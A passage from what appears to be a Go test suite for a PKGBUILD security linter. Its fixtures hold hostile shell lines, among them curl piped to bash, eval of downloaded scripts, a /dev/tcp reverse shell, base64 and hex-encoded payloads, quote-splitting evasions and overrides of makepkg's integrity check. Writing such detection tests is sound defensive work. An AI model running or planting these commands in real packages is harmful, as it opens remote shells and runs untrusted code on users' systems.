		expectNoRule(t, "PB110", files) // two sums pair with the two expanded sources
	})
	t.Run("PB113 not when a signed VCS source exists", func(t *testing.T) {
		expectNoRule(t, "PB113", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git?signed#tag=v1")
sha256sums=('SKIP')
validpgpkeys=('ABAF11C65A2970B130ABE3C479BE3E4300411886')`, "")})
	})
}

func TestHermeticRules(t *testing.T) {
	t.Run("PB201 curl in build", func(t *testing.T) {
		expectRule(t, "PB201", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  curl -O https://example.com/extra.tar.gz
}`)})
	})
	t.Run("PB201 curl in prepare is fine", func(t *testing.T) {
		expectNoRule(t, "PB201", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  curl -O https://example.com/extra.tar.gz
}`)})
	})
	t.Run("PB202 pip without hashes", func(t *testing.T) {
		expectRule(t, "PB202", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  pip install -r requirements.txt
}`)})
	})
	t.Run("PB202 pip with hashes ok", func(t *testing.T) {
		expectNoRule(t, "PB202", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  pip install --require-hashes -r requirements.txt
}`)})
	})
	t.Run("PB203 cargo build unlocked", func(t *testing.T) {
		expectRule(t, "PB203", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  cargo build --release
}`)})
	})
	t.Run("PB203 cargo --locked ok", func(t *testing.T) {
		expectNoRule(t, "PB203", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  cargo build --release --locked
}`)})
	})
	t.Run("PB204 bare go build", func(t *testing.T) {
		expectRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  go build -o demo .
}`)})
	})
	t.Run("PB204 vendored go build ok", func(t *testing.T) {
		expectNoRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  go build -mod=vendor -o demo .
}`)})
	})
	t.Run("PB204 go mod download in prepare ok", func(t *testing.T) {
		expectNoRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  go mod download
}
build() {
  go build -o demo .
}`)})
	})
	t.Run("PB205 GOFLAGS -insecure", func(t *testing.T) {
		expectRule(t, "PB205", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  GOFLAGS=-insecure go build -o demo .
}`)})
	})
	t.Run("PB206 npm install", func(t *testing.T) {
		expectRule(t, "PB206", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  npm install
}`)})
	})
	t.Run("PB206 pnpm install unlocked", func(t *testing.T) {
		expectRule(t, "PB206", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  pnpm install
}`)})
	})
	t.Run("PB206 pnpm frozen lockfile ok", func(t *testing.T) {
		expectNoRule(t, "PB206", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  pnpm install --frozen-lockfile
}`)})
	})
	t.Run("PB206 bun install unlocked", func(t *testing.T) {
		expectRule(t, "PB206", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  bun install
}`)})
	})
	t.Run("PB202 uv pip install without hashes", func(t *testing.T) {
		expectRule(t, "PB202", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  uv pip install -r requirements.txt
}`)})
	})
	t.Run("PB202 uv pip install with hashes ok", func(t *testing.T) {
		expectNoRule(t, "PB202", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  uv pip install --require-hashes -r requirements.txt
}`)})
	})
	t.Run("PB204 go install mutable @latest even in prepare", func(t *testing.T) {
		expectRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  go install github.com/example/tool@latest
}`)})
	})
	t.Run("PB204 pinned @version in prepare is fine", func(t *testing.T) {
		expectNoRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  go install github.com/example/tool@v1.2.3
}`)})
	})
	t.Run("PB207 composer install without --no-scripts", func(t *testing.T) {
		expectRule(t, "PB207", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  composer install
}`)})
	})
	t.Run("PB207 composer install --no-scripts ok", func(t *testing.T) {
		expectNoRule(t, "PB207", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  composer install --no-scripts
}`)})
	})
	t.Run("PB207 composer update re-resolves", func(t *testing.T) {
		expectRule(t, "PB207", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  composer update --no-scripts
}`)})
	})
	t.Run("PB208 bundle install unlocked", func(t *testing.T) {
		expectRule(t, "PB208", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  bundle install
}`)})
	})
	t.Run("PB208 bundle install --frozen ok", func(t *testing.T) {
		expectNoRule(t, "PB208", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  bundle install --frozen
}`)})
	})
	t.Run("PB208 gem install from RubyGems", func(t *testing.T) {
		expectRule(t, "PB208", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  gem install rails
}`)})
	})
	t.Run("PB208 gem install local .gem ok", func(t *testing.T) {
		expectNoRule(t, "PB208", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  gem install --local demo-1.0.gem
}`)})
	})
	t.Run("PB209 uv sync unlocked", func(t *testing.T) {
		expectRule(t, "PB209", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  uv sync
}`)})
	})
	t.Run("PB209 uv sync --frozen ok", func(t *testing.T) {
		expectNoRule(t, "PB209", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  uv sync --frozen
}`)})
	})
	t.Run("PB209 poetry add re-resolves", func(t *testing.T) {
		expectRule(t, "PB209", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  poetry add requests
}`)})
	})
	t.Run("PB209 poetry install against lock is fine", func(t *testing.T) {
		expectNoRule(t, "PB209", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  poetry install
}`)})
	})
	t.Run("PB201 uv sync in build is a network download", func(t *testing.T) {
		expectRule(t, "PB201", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  uv sync --frozen
}`)})
	})
	t.Run("PB201 bundle install in build is a network download", func(t *testing.T) {
		expectRule(t, "PB201", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  bundle install --frozen
}`)})
	})
}

// headerWithSource builds a PKGBUILD header whose source array is exactly src.
func headerWithSource(src string) string {
	return `pkgname=demo
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
url='https://example.com/demo'
license=('MIT')
source=(` + src + `)
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`
}

// TestHermeticityCoverageGaps covers three ways a PKGBUILD used to defeat the
// hermeticity rules: a build-phase `go get`, a source URL merely containing
// "vendor", and `export GOSUMDB=off` inside a build function.
func TestHermeticityCoverageGaps(t *testing.T) {
	// A — build-phase `go get` is an implicit download.
	t.Run("PB204 bare go get in build", func(t *testing.T) {
		expectRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  go get example.com/m
}`)})
	})
	t.Run("PB204 go get in prepare is fine", func(t *testing.T) {
		expectNoRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  go get example.com/m
}`)})
	})
	t.Run("PB204 mutable go get in build reports exactly once", func(t *testing.T) {
		ids := ruleIDs(lint(t, map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  go get example.com/m@latest
}`)}))
		if ids["PB204"] != 1 {
			t.Errorf("expected exactly one PB204, got %v", ids)
		}
	})

	// B — a "vendor" substring in a source URL must not disable PB204.
	t.Run("PB204 vendor substring in source URL does not suppress", func(t *testing.T) {
		expectRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith(
			headerWithSource(`"https://github.com/somevendor/proj/archive/v1.tar.gz"`), `
build() {
  go build -o demo .
}`)})
	})
	t.Run("PB204 real vendor archive suppresses", func(t *testing.T) {
		expectNoRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith(
			headerWithSource(`"vendor.tar.gz"`), `
build() {
  go build -o demo .
}`)})
	})
	t.Run("PB204 named vendor bundle suppresses", func(t *testing.T) {
		expectNoRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith(
			headerWithSource(`"vendor::https://example.com/demo-deps.tar.gz"`), `
build() {
  go build -o demo .
}`)})
	})
	t.Run("PB204 suffixed vendor archive suppresses", func(t *testing.T) {
		expectNoRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith(
			headerWithSource(`"https://example.com/demo-1.0-vendor.tar.zst"`), `
build() {
  go build -o demo .
}`)})
	})

	// C — export/declare inside a function is a DeclClause, not a Command.
	t.Run("PB205 export GOSUMDB=off inside build", func(t *testing.T) {
		expectRule(t, "PB205", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  export GOSUMDB=off
  go build -mod=vendor -o demo .
}`)})
	})
	t.Run("PB205 declare GOINSECURE inside build", func(t *testing.T) {
		expectRule(t, "PB205", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  declare GOINSECURE='*.example.com'
  go build -mod=vendor -o demo .
}`)})
	})
	t.Run("PB205 top-level export reports exactly once", func(t *testing.T) {
		ids := ruleIDs(lint(t, map[string]string{"PKGBUILD": pkgbuildWith("", `
export GOSUMDB=off

build() {
  go build -mod=vendor -o demo .
}`)}))
		if ids["PB205"] != 1 {
			t.Errorf("expected exactly one PB205, got %v", ids)
		}
	})
	t.Run("PB205 bare top-level assignment still fires", func(t *testing.T) {
		expectRule(t, "PB205", map[string]string{"PKGBUILD": pkgbuildWith("", `
GOSUMDB=off

build() {
  go build -mod=vendor -o demo .
}`)})
	})
	t.Run("PB205 benign export inside build is fine", func(t *testing.T) {
		expectNoRule(t, "PB205", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  export GOFLAGS=-trimpath
  go build -mod=vendor -o demo .
}`)})
	})
}

func TestExecRules(t *testing.T) {
	t.Run("PB301 top-level command", func(t *testing.T) {
		expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `curl https://example.com/beacon`)})
	})
	t.Run("PB301 top-level assignments fine", func(t *testing.T) {
		expectNoRule(t, "PB301", map[string]string{"PKGBUILD": cleanPKGBUILD})
	})
	t.Run("PB301 function declared inside a top-level if is not top-level code", func(t *testing.T) {
		// The AUR idiom for a package that is both a -git and a release build:
		// pick between two pkgver() bodies with a top-level `if`. The bodies run
		// when makepkg calls the phase, not when the file is sourced.
		expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `
if [[ -n $_git ]]; then
  pkgver() {
    cd "$srcdir"
    git describe --tags
  }
else
  pkgver() {
    printf '%s' "$pkgver"
  }
fi`)})
	})
	t.Run("PB301 nested function body still reaches function-scoped rules", func(t *testing.T) {
		// The flip side: once attributed to pkgver(), PB602 can see it. Before
		// the nested-FuncDecl fix this network call was invisible to every rule
		// that keys off the enclosing function.
		expectRule(t, "PB602", map[string]string{"PKGBUILD": pkgbuildWith("", `
if [[ -n $_git ]]; then
  pkgver() {
    curl -s https://example.com/version
  }
fi`)})
	})
	t.Run("PB301 inert top-level guards and banners are not flagged", func(t *testing.T) {
		expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `
if [ "$CARCH" = "i686" ]; then
  _lib=lib32
fi
test -n "$_lib"
echo "building $pkgname"
printf '%s\n' "$_lib"
warning "this package is deprecated"
msg2 "using $_lib"
cat /dev/null`)})
	})
	t.Run("PB301 an inert command that redirects to a file is a write", func(t *testing.T) {
		for _, line := range []string{
			"cat <<EOF > helper.sh\n#!/bin/sh\nEOF",
			`echo "payload" > dropped.txt`,
			`printf '%s' x >> appended.txt`,
		} {
			expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", line)})
		}
	})
	t.Run("PB301 a locally redefined banner command gets no exemption", func(t *testing.T) {
		expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `
warning() {
  curl -s https://example.com/x | sh
}
warning "totally harmless banner"`)})
	})
	t.Run("PB301 redefinition nested in a conditional gets no exemption either", func(t *testing.T) {
		// Unit.Functions does not carry nested declarations, so the exemption
		// has to consult the names collected at every depth.
		expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `
if true; then
  warning() { curl -s https://example.com/x | sh; }
fi
warning "totally harmless banner"`)})
	})
	t.Run("PB301 defers eval to PB302", func(t *testing.T) {
		src := map[string]string{"PKGBUILD": pkgbuildWith("", `eval "$_stuff"`)}
		expectNoRule(t, "PB301", src)
		expectRule(t, "PB302", src)
	})
	t.Run("PB302 eval", func(t *testing.T) {
		expectRule(t, "PB302", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  eval "$stuff"
}`)})
	})
	t.Run("PB303 base64 decode into shell", func(t *testing.T) {
		expectRule(t, "PB303", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  echo "$payload" | base64 -d | bash
}`)})
	})
	t.Run("PB304 curl into shell", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  curl -fsSL https://example.com/setup.sh | sh
}`)})
	})
	t.Run("PB304 source of process substitution", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  source <(curl -s https://example.com/env.sh)
}`)})
	})
	t.Run("PB304 sh -c command substitution", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  sh -c "$(wget -qO- https://example.com/run.sh)"
}`)})
	})
	t.Run("PB304 interpreter given its own program consumes the download as data", func(t *testing.T) {
		// The pkgver() idiom: fetch a registry's JSON and print one field. The
		// program is the -c literal, already on disk and under review; the
		// response is its input, not code.
		expectNoRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  curl -s https://example.com/v.json | python3 -c "import sys,json; print(json.load(sys.stdin)['version'])"
  curl -s https://example.com/v.json | python3 -m json.tool
  curl -s https://example.com/v.json | node ./parse.mjs
}`)})
	})
	t.Run("PB304 interpreter reading its program from stdin still executes it", func(t *testing.T) {
		for _, sink := range []string{"python3", "python3 -", `python3 -c "exec(sys.stdin.read())"`} {
			expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  curl -s https://example.com/x | `+sink+`
}`)})
		}
	})
	t.Run("PB305 dev tcp", func(t *testing.T) {
		expectRule(t, "PB305", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  bash -i >/dev/tcp/198.51.100.1/4444 0<&1
}`)})
	})
	t.Run("PB306 indirect command", func(t *testing.T) {
		expectRule(t, "PB306", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  x=curl
  "${!x}" https://example.com
}`)})
	})
	t.Run("PB307 hex escape payload", func(t *testing.T) {
		expectRule(t, "PB307", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  p=$'\x62\x61\x73\x68\x20\x2d\x63\x20\x65\x76\x69\x6c'
}`)})
	})
	t.Run("PB307 base64 blob payload", func(t *testing.T) {
		expectRule(t, "PB307", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  payload='`+strings.Repeat("QmFzZTY0", 16)+`'
}`)})
	})
	t.Run("PB307 not for checksum arrays", func(t *testing.T) {
		// The first line is exempted by its sums= assignment, the
		// continuation line by being pure hex.
		digest := strings.Repeat("deadbeef", 16)
		expectNoRule(t, "PB307", map[string]string{"PKGBUILD": pkgbuildWith("", `
sha512sums=('`+digest+`'
            '`+digest+`')`)})
	})
	t.Run("PB308 overrides a makepkg internal", func(t *testing.T) {
		expectRule(t, "PB308", map[string]string{"PKGBUILD": pkgbuildWith("", `
verify_integrity_one() {
  return 0
}`)})
	})
	t.Run("PB308 ordinary package functions are fine", func(t *testing.T) {
		expectNoRule(t, "PB308", map[string]string{"PKGBUILD": cleanPKGBUILD})
	})
	t.Run("PB309 bidi override control", func(t *testing.T) {
		expectRule(t, "PB309", map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  make ‮install\n}")})
	})
	t.Run("PB309 zero-width character", func(t *testing.T) {
		expectRule(t, "PB309", map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  ma​ke\n}")})
	})
	t.Run("PB309 plain ASCII is clean", func(t *testing.T) {
		expectNoRule(t, "PB309", map[string]string{"PKGBUILD": cleanPKGBUILD})
	})
}

// Adversarial variants that trivially evade regex scanners but not an AST.
func TestAdversarialEvasion(t *testing.T) {
	t.Run("line continuations inside the pipeline", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  curl \
    -fsSL \
    https://example.com/x.sh \
    | \
    bash
}`)})
	})
	t.Run("quote-splitting the command name", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  'cu'"rl" https://example.com/x.sh | 'ba'sh
}`)})
	})
	t.Run("wrapper commands around the downloader", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  env -i curl https://example.com/x.sh | env bash
}`)})
	})
	t.Run("full path to interpreter", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  wget -qO- https://example.com/x.sh | /usr/bin/bash
}`)})
	})
	t.Run("eval of downloaded content", func(t *testing.T) {
		files := map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  eval "$(curl -s https://example.com/x.sh)"
}`)}
		expectRule(t, "PB302", files)
		findings := lint(t, files)
		for _, f := range findings {
			if f.RuleID == "PB302" && f.Severity != Critical {
				t.Errorf("eval of download should be critical, got %s", f.Severity)
			}
		}
	})
}

func TestFSRules(t *testing.T) {
	t.Run("PB401 write to home", func(t *testing.T) {
		expectRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  echo 'alias x=y' >> "$HOME/.bashrc"
}`)})
	})
	t.Run("PB401 cp to /etc", func(t *testing.T) {
		expectRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  cp demo.conf /etc/demo.conf
}`)})
	})
	t.Run("PB401 install into pkgdir fine", func(t *testing.T) {
		expectNoRule(t, "PB401", map[string]string{"PKGBUILD": cleanPKGBUILD})
	})
	t.Run("PB401 scriptlet writes to the live system fine", func(t *testing.T) {
		// A scriptlet runs after pacman has unpacked the package; writing to
		// absolute paths is what it is for. $pkgdir does not even exist there.
		expectNoRule(t, "PB401", map[string]string{
			"PKGBUILD": pkgbuildWith("", "install=demo.install"),
			"demo.install": `post_install() {
  cp /usr/share/demo/demo.conf /etc/demo.conf
  echo restored >>/var/lib/demo/state
}`,
		})
	})
	t.Run("PB401 scriptlet hook in PKGBUILD is not a build write", func(t *testing.T) {
		// pacman only calls hooks out of the install= file, so a post_install
		// defined in the PKGBUILD is dead code — never a build-time write.
		expectNoRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
post_install() {
  cp demo.conf /etc/demo.conf
}`)})
	})
	t.Run("PB401 redirect in a PKGBUILD scriptlet hook is dead code too", func(t *testing.T) {
		// The redirect walk has to make the same call the command path does.
		expectNoRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
post_install() {
  echo done >/etc/demo.conf
}`)})
	})
	t.Run("PB401 tty and shm writes fine", func(t *testing.T) {
		expectNoRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  echo building >/dev/tty
  make >/dev/shm/demo.log
}`)})
	})
	t.Run("PB401 a path the function restaged is not the live one", func(t *testing.T) {
		// The dm-fotowelt shape: a top-level install prefix that package()
		// rebinds under $pkgdir before using it. Rendering the later uses
		// against the top-level value reports writes to /usr/share that the
		// build never performs.
		expectNoRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
_installDir=/usr/share/demo
package() {
  _installDir=$pkgdir$_installDir
  mkdir -p $_installDir
  rm -rf $_installDir/.log
}`)})
	})
	t.Run("PB401 a redirect through a restaged path is not the live one", func(t *testing.T) {
		// The same shape through a redirect instead of a command: the target
		// must render against the function's view, not the file-level value.
		expectNoRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
_installDir=/usr/share/demo
package() {
  _installDir=$pkgdir$_installDir
  echo installed >"$_installDir/log"
}`)})
	})
	t.Run("PB401 a path an earlier phase restaged is not the live one", func(t *testing.T) {
		// makepkg runs prepare, build, check and package in one shell, so a
		// name build() rewrote is still rewritten by the time package() runs.
		expectNoRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
_out=/opt/demo
build() {
  _out=$srcdir/out
}
package() {
  mkdir -p $_out
}`)})
	})
	t.Run("PB401 a local in an earlier phase dies with it", func(t *testing.T) {
		// prepare()'s `local _dir` shadows the file-level value only inside
		// prepare; by the time package() runs, $_dir is /opt/demo again, and
		// the write it names is real.
		expectRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
_dir=/opt/demo
prepare() {
  local _dir="$srcdir/tmp"
  mkdir -p "$_dir"
}
package() {
  mkdir -p "$_dir"
}`)})
	})
	t.Run("PB401 a path a later phase rebinds is still checked", func(t *testing.T) {
		// package() runs last: nothing it does reaches back into build().
		expectRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
_out=/opt/demo
build() {
  mkdir -p $_out
}
package() {
  _out=$pkgdir/opt/demo
  mkdir -p $_out
}`)})
	})
	t.Run("PB402 sudo", func(t *testing.T) {
		expectRule(t, "PB402", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  sudo make install
}`)})
	})
	t.Run("PB402 sudo in scriptlet fine", func(t *testing.T) {
		// Scriptlets already run as root, so there is nothing to escalate; the
		// common use is `sudo -u` dropping *down* to an ordinary user.
		expectNoRule(t, "PB402", map[string]string{
			"PKGBUILD": pkgbuildWith("", "install=demo.install"),
			"demo.install": `post_install() {
  sudo -u demo /usr/bin/demo --migrate
}`,
		})
	})
	t.Run("PB403 setuid chmod", func(t *testing.T) {
		expectRule(t, "PB403", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  chmod u+s "$pkgdir/usr/bin/demo"
}`)})
	})
	t.Run("PB403 setuid install mode", func(t *testing.T) {
		expectRule(t, "PB403", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  install -Dm4755 demo "$pkgdir/usr/bin/demo"
}`)})
	})
	t.Run("PB403 ordinary install mode fine", func(t *testing.T) {
		expectNoRule(t, "PB403", map[string]string{"PKGBUILD": cleanPKGBUILD})
	})
	t.Run("PB403 setcap in package()", func(t *testing.T) {
		expectRule(t, "PB403", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  setcap cap_net_raw+ep "$pkgdir/usr/bin/demo"
}`)})
	})
	t.Run("PB403 setcap in post_install scriptlet", func(t *testing.T) {
		expectRule(t, "PB403", map[string]string{
			"PKGBUILD": pkgbuildWith("", "install=demo.install"),
			"demo.install": `post_install() {
  setcap cap_setuid+ep /usr/bin/demo
}`,
		})
	})
	t.Run("PB403 setcap -r removal is fine", func(t *testing.T) {
		expectNoRule(t, "PB403", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  setcap -r "$pkgdir/usr/bin/demo"
}`)})
	})
	t.Run("PB404 make install without destdir", func(t *testing.T) {
		expectRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  make install
}`)})
	})
	t.Run("PB404 DESTDIR arg is fine", func(t *testing.T) {
		expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  make DESTDIR="$pkgdir" install
}`)})
	})
	t.Run("PB404 exported DESTDIR is fine", func(t *testing.T) {
		expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  export DESTDIR="$pkgdir"
  ninja -C build install
}`)})
	})
	t.Run("PB404 cmake --install with prefix is fine", func(t *testing.T) {
		expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  cmake --install build --prefix "$pkgdir/usr"
}`)})
	})
	t.Run("PB404 install outside package() ignored", func(t *testing.T) {
		expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  make install
}`)})
	})
	t.Run("PB404 prefix bound at configure time is fine", func(t *testing.T) {
		// The build tree already stages into $pkgdir, so the bare install in
		// package() never touches the live system.
		expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  cmake -B build -DCMAKE_INSTALL_PREFIX="$pkgdir/usr"
  cmake --build build
}
package() {
  cmake --install build
}`)})
	})
	t.Run("PB404 configure prefix without pkgdir is still flagged", func(t *testing.T) {
		expectRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  cmake -B build -DCMAKE_INSTALL_PREFIX=/usr
  cmake --build build
}
package() {
  cmake --install build
}`)})
	})
	t.Run("PB404 destdir bound by a called helper is fine", func(t *testing.T) {
		expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
_setup() {
  export PERL_MM_OPT="INSTALLDIRS=vendor DESTDIR='$pkgdir'"
}
package() {
  _setup
  make install
}`)})
	})
	t.Run("PB404 install into a pkgdir virtualenv is fine", func(t *testing.T) {
		// The activated venv lives in the staging tree, so pip writes there.
		expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  python -m venv "$pkgdir/usr/lib/demo"
  source "$pkgdir/usr/lib/demo/bin/activate"
  pip install -r requirements.txt
}`)})
	})
	t.Run("PB404 pip install with no venv is still flagged", func(t *testing.T) {
		expectRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  pip install --break-system-packages installer
}`)})
	})
	t.Run("PB404 staging bound by a non-standard variable is fine", func(t *testing.T) {
		expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  make INSTALL_ROOT="$pkgdir" install
}`)})
	})
	t.Run("PB405 write to pacman.conf", func(t *testing.T) {
		files := map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  echo 'SigLevel = Never' >> /etc/pacman.conf
}`)}
		expectRule(t, "PB405", files)
		expectNoRule(t, "PB401", files) // PB405 owns sensitive paths; no double report
	})
	t.Run("PB405 pacman-key", func(t *testing.T) {
		expectRule(t, "PB405", map[string]string{
			"PKGBUILD": pkgbuildWith("", "install=demo.install"),
			"demo.install": `post_install() {
  pacman-key --recv-keys DEADBEEF
}`,
		})
	})
	t.Run("PB405 staged pacman.conf under pkgdir is fine", func(t *testing.T) {
		expectNoRule(t, "PB405", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  install -Dm644 pacman.conf "$pkgdir/etc/pacman.conf"
}`)})
	})
	t.Run("PB405 removing a sensitive path is not a write to it", func(t *testing.T) {
		// Retracting a sudoers fragment an older release shipped withdraws the
		// escalation path; reporting it as granting one is backwards. PB502
		// still reports the removal, worded as a removal.
		files := map[string]string{
			"PKGBUILD":     pkgbuildWith("", "install=demo.install"),
			"demo.install": "post_remove() {\n  rm -f /etc/sudoers.d/demo\n}\n",
		}
		expectNoRule(t, "PB405", files)
		expectRule(t, "PB502", files)
	})
	t.Run("PB405 writing a sudoers fragment is still critical", func(t *testing.T) {
		expectRule(t, "PB405", map[string]string{
			"PKGBUILD":     pkgbuildWith("", "install=demo.install"),
			"demo.install": "post_install() {\n  install -Dm440 /dev/null /etc/sudoers.d/demo\n}\n",
		})
	})
}

func TestScriptletRules(t *testing.T) {
	base := pkgbuildWith("", "install=demo.install")
	t.Run("PB501 curl in post_install", func(t *testing.T) {
		expectRule(t, "PB501", map[string]string{
			"PKGBUILD": base,
			"demo.install": `post_install() {
  curl -s https://example.com/track
}`,
		})
	})
	t.Run("PB502 crontab", func(t *testing.T) {
		expectRule(t, "PB502", map[string]string{
			"PKGBUILD": base,
			"demo.install": `post_install() {
  crontab /tmp/x
}`,
		})
	})
	t.Run("PB502 login shell user", func(t *testing.T) {
		expectRule(t, "PB502", map[string]string{
			"PKGBUILD": base,
			"demo.install": `post_install() {
  useradd -r -s /bin/bash demo
}`,
		})
	})
	t.Run("clean scriptlet fine", func(t *testing.T) {
		ids := ruleIDs(lint(t, map[string]string{
			"PKGBUILD": base,
			"demo.install": `post_install() {
  update-desktop-database -q
}`,
		}))
		for _, id := range []string{"PB501", "PB502"} {
			if ids[id] != 0 {
				t.Errorf("unexpected %s: %v", id, ids)
			}
		}
	})
}

func TestConsistencyRules(t *testing.T) {
	t.Run("PB601 pkgver mismatch", func(t *testing.T) {
		expectRule(t, "PB601", map[string]string{
			"PKGBUILD": cleanPKGBUILD,
			".SRCINFO": `pkgbase = demo
	pkgver = 9.9.9
	pkgrel = 1
	url = https://github.com/example/demo
	source = demo-1.0.0.tar.gz::https://github.com/example/demo/archive/v1.0.0.tar.gz

pkgname = demo
`,
		})
	})
	t.Run("PB601 matching srcinfo fine", func(t *testing.T) {
		expectNoRule(t, "PB601", map[string]string{
			"PKGBUILD": cleanPKGBUILD,
			".SRCINFO": `pkgbase = demo
	pkgver = 1.0.0
	pkgrel = 1
	url = https://github.com/example/demo
	source = demo-1.0.0.tar.gz::https://github.com/example/demo/archive/v1.0.0.tar.gz

pkgname = demo
`,
		})
	})
	t.Run("PB602 curl in pkgver", func(t *testing.T) {
		expectRule(t, "PB602", map[string]string{"PKGBUILD": pkgbuildWith("", `
pkgver() {
  curl -s https://example.com/latest
}`)})
	})
	t.Run("PB603 provides claiming pacman", func(t *testing.T) {
